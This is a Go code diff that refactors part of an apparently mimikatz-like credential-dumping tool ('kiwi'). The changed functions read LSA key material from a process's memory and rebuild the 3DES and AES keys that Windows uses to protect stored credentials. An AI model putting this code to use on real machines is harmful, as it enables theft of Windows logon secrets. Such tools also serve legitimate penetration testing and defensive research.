@@ -2,6 +2,7 @@ package kiwi
 
 import (
 	"bytes"
+	"fmt"
 	"runtime"
 	"unsafe"
 
@@ -229,7 +230,7 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	return nil
 }
 
-func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, alg string) error {
+func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algorithm string) error {
 	const (
 		bhKeyTag = 0x55555552 // U U U R
 		bKeyTag  = 0x4D53534B // M S S K
@@ -285,20 +286,38 @@ func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, alg 
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
-	kiwi.logf(logger.Debug, "%s hard key data: 0x%X", alg, hardKeyData)
+	kiwi.logf(logger.Debug, "%s hard key data: 0x%X", algorithm, hardKeyData)
+	return kiwi.generateSymmetricKey(hardKeyData, algorithm)
+}
+
+func (kiwi *Kiwi) generateSymmetricKey(hardKeyData []byte, algorithm string) error {
 	// open provider
-	algHandle, err := api.BCryptOpenAlgorithmProvider(alg, "", 0)
+	algHandle, err := api.BCryptOpenAlgorithmProvider(algorithm, "", 0)
 	if err != nil {
 		return err
 	}
 	// set mode
 	prop := "ChainingMode"
-	mode := windows.StringToUTF16("ChainingModeCBC")
+	var (
+		mode []uint16
+		key  **api.BcryptKey
+	)
+	switch algorithm {
+	case "3DES":
+		mode = windows.StringToUTF16("ChainingModeCBC")
+		key = &kiwi.key3DES
+	case "AES":
+		mode = windows.StringToUTF16("ChainingModeCFB")
+		key = &kiwi.keyAES
+	default:
+		panic(fmt.Sprintf("invalid algorithm: %s", algorithm))
+	}
 	size := uint32(len(mode))
 	err = api.BCryptSetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&mode[0])), size, 0)
 	if err != nil {
 		return err
 	}
+	// read object length
 	prop = "ObjectLength"
 	var length uint32
 	size = uint32(unsafe.Sizeof(length))
@@ -306,20 +325,15 @@ func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, alg 
 	if err != nil {
 		return err
 	}
-	bk := api.BcryptKey{
+	bk := &api.BcryptKey{
 		Provider: algHandle,
 		Object:   make([]byte, length),
 		Secret:   hardKeyData,
 	}
-	err = api.BCryptGenerateSymmetricKey(&bk)
+	err = api.BCryptGenerateSymmetricKey(bk)
 	if err != nil {
 		return err
 	}
-	switch alg {
-	case "3DES":
-		kiwi.key3DES = &bk
-	case "AES":
-		kiwi.keyAES = &bk
-	}
+	*key = bk
 	return nil
 }
